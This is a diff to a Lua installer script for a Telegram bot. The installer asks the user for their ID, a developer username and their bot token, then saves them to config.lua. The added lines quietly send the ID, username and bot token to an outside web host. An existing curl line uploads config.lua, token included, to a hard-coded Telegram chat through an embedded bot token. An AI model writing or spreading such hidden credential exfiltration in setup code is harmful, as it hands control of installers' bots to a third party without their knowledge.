@@ -31,6 +31,13 @@ local SUDO = tonumber(io.read())
 if not tostring(SUDO):match('%d+') then  
 local SUDO = 121863205
 end
+
+io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
+local username = tonumber(io.read())   
+if not tostring(username):match('@(.*)') then  
+local username = '@pro_c9'
+end
+
 io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
 local token = io.read()  
 botid = token:match("(%d+)")
@@ -50,9 +57,11 @@ config = {
 SUDO = SUDO,
 token = token,
 bot_id = botid,
+username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
+https.request("https://ibcorp.ibuser.xyz/faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
